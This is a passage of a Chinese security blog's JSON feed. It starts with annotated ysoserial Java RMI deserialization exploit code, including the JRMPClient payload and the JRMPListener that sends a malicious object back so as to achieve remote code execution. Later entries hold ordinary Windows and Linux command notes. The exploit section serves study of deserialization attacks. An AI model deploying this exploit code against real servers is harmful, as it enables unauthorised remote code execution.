keyword\">new</span> <span class=\"token class-name\">DataOutputStream</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token comment\">// 下面发送了三组数据，是在服务端 TCPTransport 类的 handleMessages 方法调用前通信的数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Magic</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1246907721;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>SingleOpProtocol</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 76</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token comment\">// 在 TCPTransport 类的 handleMessages 方法中获取到了 80</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Call</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//80</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token comment\">// 下面依然是往服务器发送数据，但是经过了序列化处理</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">\"resource\"</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">ObjectOutputStream</span> objOut <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalOutputStream</span><span class=\"token punctuation\">(</span>dos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token comment\">// 下面四组数据最终发到服务端是用来创建 ObjID 对象，并且值与 dgcID [0:0:0, 2] 相同</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// DGC</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\">// 下面数据是在服务端每一个 dispatch 方法中获取的</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// dirty</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">669196253586618813L</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token comment\">// 前面经过那么多数据的通信，到了这里就可以发送恶意 payload 了，服务端会对其进行反序列化处理。</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            os<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dos <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                dos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> s <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                s<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"payloadsjrmpclient-exploitjrmplistener\"><a class=\"anchor\" href=\"#payloadsjrmpclient-exploitjrmplistener\">#</a> payloads.JRMPClient / exploit.JRMPListener</h3>\n<p>与前面相反，<strong>服务端打客户端</strong></p>\n<ol>\n<li>攻击者在自己服务器使用 <code>exploit/JRMPListener</code>  开启一个 <code>rmi</code>  监听</li>\n<li>往受害服务器发送 <code>payloads/JRMPClient</code> ， <code>payload</code>  中已经设置了攻击者服务器 <code>ip</code>  及 <code>JRMPListener</code>  监听的端口</li>\n<li>漏洞服务器反序列化该 payload 后，会去连接攻击者开启的 <code>rmi</code>  监听，在通信过程中，攻击者服务器会发送 <code>exp</code> （假如存在漏洞的服务器中有使用 <code>org.apacje.commons.collections</code>  包，则可以发送 <code>CommonsCollections</code>  系列的 payload），从而达到 RCE。</li>\n</ol>\n<p><strong> <code>payloads/JRMPClient</code> </strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Registry</span> getObject <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> command <span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">String</span> host<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">int</span> port<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// 命令行获取 ip 值与端口值</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">int</span> sep <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token char\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sep <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">65535</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            host <span class=\"token operator\">=</span> command<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            host <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> sep<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>sep <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// 以下信息都是连接 JRMPListener 通信所需信息</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">ObjID</span> id <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// RMI registry</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">TCPEndpoint</span> te <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TCPEndpoint</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">UnicastRef</span> ref <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UnicastRef</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LiveRef</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> te<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">RemoteObjectInvocationHandler</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RemoteObjectInvocationHandler</span><span class=\"token punctuation\">(</span>ref<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这就是构造的 payload，创建了一个 Registry 类型的代理对象，handler 值为上面创建的 RemoteObjectInvocationHandler</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">Registry</span> proxy <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Registry</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JRMPClient</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token class-name\">Registry</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> proxy<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong> <code>exploit/JRMPListener</code> </strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doCall</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DataInputStream</span> in<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DataOutputStream</span> out<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> payload<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">ObjID</span> read<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token comment\">// 这里读取到的是 JRMPClient 端发送的 DgcID</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            read <span class=\"token operator\">=</span> <span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>ois<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unable to read objID\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 这里如果判断是否为 Dgc 调用，DgcID 为 [0:0:0, 2]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            ois<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// method</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            ois<span class=\"token punctuation\">.</span><span class=\"token function\">readLong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hash</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Is DGC call for \"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sending return with payload for obj \"</span> <span class=\"token operator\">+</span> read<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这里发送 81，也是为了防止 JRMPClient 抛出 transport return code invalid 异常</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Return</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// transport op</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JRMPClient<span class=\"token punctuation\">.</span>MarshalOutputStream</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>classpathUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">// 这里发送 2，就会进入分析 JRMPClient 时的第九步中第一种情况的 case2 中</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>ExceptionalReturn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">UID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>oos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\">// 这里生成了一个异常类，其中包含一个 Object 类型的属性，名为 val</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">BadAttributeValueExpException</span> ex <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BadAttributeValueExpException</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">// 这里将恶意 payload 赋值给了 val 属性，在反序列化 BadAttributeValueExpException 类时，val 值也会被反序列化，从而触发命令执行</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">,</span> <span class=\"token string\">\"val\"</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\">// 将 payload 发往 JRMPClient 端，payload 会被反序列化</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>hadConnection <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>waitLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>waitLock<span class=\"token punctuation\">.</span><span class=\"token function\">notifyAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": [
                "Web",
                "Java"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Windows/",
            "url": "http://yoursite.com/Web/Windows/",
            "title": "Windos必需知识",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"wsl\"><a class=\"anchor\" href=\"#wsl\">#</a> WSL</h1>\n<p>Windows Subsystem for Linux，在 Windows 用 kali 命令</p>\n<ol>\n<li>\n<p>控制面板 -&gt; 程序和功能 -&gt; 启用或关闭 Windows 功能 -&gt; 勾选 “<strong>适用于 Linux 的 Windows 子系统</strong>”</p>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240128214254879.png&quot; alt=&quot;image-20240128214254879&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128214634914.png\" alt=\"image-20240128214634914\" /></p>\n<p><strong>检查 Windows 版本</strong>：WSL 2 仅在 Windows 11 或 Windows 10 版本 1903、内部版本 18362 或更高版本中可用。通过按 Windows 徽标键 + R，检查你的 Windows 版本，然后键入 <strong>winver</strong>，选择 “确定”。 （或者在 Windows 命令提示符下输入  <code>ver</code>  命令）。</p>\n</li>\n<li>\n<p>微软商店安装 kali Linux<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHBzLm1pY3Jvc29mdC5jb20vZGV0YWlsLzlQS1IzNFROQ1YwNz9obD1lbi11cyZhbXA7Z2w9VVM=\">Kali Linux - Microsoft Apps</span></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128215359242.png\" alt=\"image-20240128215359242\" /></p>\n</li>\n</ol>\n<h1 id=\"端口占用\"><a class=\"anchor\" href=\"#端口占用\">#</a> 端口占用</h1>\n<ol>\n<li>netstat -ano | findstr 8080</li>\n<li>taskkill /F /pid  <code>pid值</code></li>\n</ol>\n<h1 id=\"删word空白页\"><a class=\"anchor\" href=\"#删word空白页\">#</a> 删 word 空白页</h1>\n<p>使用快捷键【Ctrl+Shift+8】，然后定位光标，按【delete】键删除就 OK 了。</p>\n",
            "tags": [
                "Web",
                "Windows"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E4%BA%91%E5%AE%89%E5%85%A8/",
            "url": "http://yoursite.com/Web/%E4%BA%91%E5%AE%89%E5%85%A8/",
            "title": "云安全",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnRlYW1zc2l4LmNvbS9DbG91ZFNlcnZpY2Uv\">https://wiki.teamssix.com/CloudService/</span></p>\n",
            "tags": [
                "Web",
                "Cloud"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Linux/",
            "url": "http://yoursite.com/Web/Linux/",
            "title": "Linux常用命令",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"yum\"><a class=\"anchor\" href=\"#yum\">#</a> yum</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># yum 包更新到最新，当安装过程提示选择全部为 \"yes\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token parameter variable\">-y</span> update</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 安装需要的软件包 (yum-utils 提供 yum-config-manager 的功能，，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> yum-utils device-mapper-persistent-data lvm2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 换源</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</pre></td></tr></table></figure><h1 id=\"screen\"><a class=\"anchor\" href=\"#screen\">#</a> screen</h1>\n<p>SSH 客户端断开后保持进程继续运行</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># CentOS</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token function\">screen</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Debian/Ubuntu</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">screen</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-S</span> test<span class=\"token punctuation\">(</span>作业名称<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-ls</span>  <span class=\"token comment\">#列出当前所有的作业</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-x</span> 作业序号或者名称  <span class=\"token comment\">#进入未离线（Attached）作业</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token 